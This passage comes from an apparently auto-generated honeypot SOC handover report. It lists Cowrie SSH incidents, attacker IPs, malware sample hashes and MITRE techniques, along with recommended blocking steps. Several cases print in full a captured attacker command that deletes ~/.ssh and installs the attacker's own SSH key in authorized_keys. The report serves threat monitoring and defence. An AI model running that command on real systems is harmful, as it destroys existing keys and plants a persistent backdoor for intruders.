| `2026-04-26 10:25:35` | `cowrie.login.success` |
| `2026-04-26 10:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5dacb298af5

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 10:28 |
| **Last Seen** | 2026-04-26 10:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:28:48` | `cowrie.session.connect` |
| `2026-04-26 10:28:48` | `cowrie.client.version` |
| `2026-04-26 10:28:49` | `cowrie.client.kex` |
| `2026-04-26 10:28:50` | `cowrie.login.success` |
| `2026-04-26 10:28:51` | `cowrie.session.params` |
| `2026-04-26 10:28:51` | `cowrie.command.input` |
| `2026-04-26 10:28:51` | `cowrie.command.failed` |
| `2026-04-26 10:28:51` | `cowrie.log.closed` |
| `2026-04-26 10:28:52` | `cowrie.session.params` |
| `2026-04-26 10:28:52` | `cowrie.command.input` |
| `2026-04-26 10:28:52` | `cowrie.session.file_download` |
| `2026-04-26 10:28:52` | `cowrie.log.closed` |
| `2026-04-26 10:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68bb376e6f9f

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 10:28 |
| **Last Seen** | 2026-04-26 10:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:28:56` | `cowrie.session.connect` |
| `2026-04-26 10:28:56` | `cowrie.client.version` |
| `2026-04-26 10:28:56` | `cowrie.client.kex` |
| `2026-04-26 10:28:57` | `cowrie.login.success` |
| `2026-04-26 10:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-030198d93ce0

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 10:42 |
| **Last Seen** | 2026-04-26 10:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:42:34` | `cowrie.session.connect` |
| `2026-04-26 10:42:34` | `cowrie.client.version` |
| `2026-04-26 10:42:34` | `cowrie.client.kex` |
| `2026-04-26 10:42:35` | `cowrie.login.success` |
| `2026-04-26 10:42:36` | `cowrie.session.params` |
| `2026-04-26 10:42:36` | `cowrie.command.input` |
| `2026-04-26 10:42:36` | `cowrie.command.failed` |
| `2026-04-26 10:42:36` | `cowrie.log.closed` |
| `2026-04-26 10:42:37` | `cowrie.session.params` |
| `2026-04-26 10:42:37` | `cowrie.command.input` |
| `2026-04-26 10:42:37` | `cowrie.session.file_download` |
| `2026-04-26 10:42:37` | `cowrie.log.closed` |
| `2026-04-26 10:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5908ca16548d

| Field | Detail |
|---|---|
| **Source IP** | `179.111.100[.]172` |
| **First Seen** | 2026-04-26 10:42 |
| **Last Seen** | 2026-04-26 10:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 10:42:41` | `cowrie.session.connect` |
| `2026-04-26 10:42:41` | `cowrie.client.version` |
| `2026-04-26 10:42:41` | `cowrie.client.kex` |
| `2026-04-26 10:42:43` | `cowrie.login.success` |
| `2026-04-26 10:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.111.100[.]172` to AbuseIPDB if not already reported
- [ ] Block `179.111.100[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.62.175[.]248` | **32** | 2026-04-26 10:28 | 2026-04-26 10:29 | 7m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.76.225[.]20` | **32** | 2026-04-26 09:45 | 2026-04-26 09:46 | 5m | 4 | `T1110.001` | 🟠 MEDIUM |
| `103.149.27[.]208` | **25** | 2026-04-26 09:10 | 2026-04-26 09:33 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.111.100[.]172` | **18** | 2026-04-26 09:43 | 2026-04-26 10:49 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.206.32[.]4` | **12** | 2026-04-26 09:07 | 2026-04-26 09:29 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.127[.]32` | **5** | 2026-04-26 09:47 | 2026-04-26 10:00 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.30.72[.]108` | **2** | 2026-04-26 09:14 | 2026-04-26 09:16 | 2m | 0 | `T1592` | 🟢 LOW |
| `40.124.172[.]146` | **2** | 2026-04-26 09:43 | 2026-04-26 09:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]30` | 1 | 2026-04-26 09:05 | 2026-04-26 09:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.151[.]153` | 1 | 2026-04-26 09:47 | 2026-04-26 09:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.229.9[.]110` | 1 | 2026-04-26 09:45 | 2026-04-26 09:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-04-26 09:16 | 2026-04-26 09:16 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.116[.]192` | 1 | 2026-04-26 09:46 | 2026-04-26 09:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]147` | 1 | 2026-04-26 09:49 | 2026-04-26 09:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.136.214[.]177` | 1 | 2026-04-26 10:19 | 2026-04-26 10:19 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.130[.]174` | 1 | 2026-04-26 10:09 | 2026-04-26 10:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.62.175[.]248` | BE | Google LLC | **100** ⚠️ | 0 |
| `34.76.225[.]20` | BE | Google LLC | **100** ⚠️ | 2 |
| `172.206.32[.]4` | US | Microsoft Limited | **100** ⚠️ | 7 |
| `103.149.27[.]208` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `179.111.100[.]172` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 9 |
| `112.30.72[.]108` | CN | China Mobile Communications Corporation | **100** ⚠️ | 7 |
| `114.220.238[.]30` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `14.103.116[.]192` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.127[.]32` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 100 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 65 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 34 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 172 cases |
| Tool 34  | Credential Extractor        | ✅ 102 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 34 priority case(s) shown individually · 16 recon entry/entries in table (8 group(s) consolidating 128 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-26T10:51:20Z_
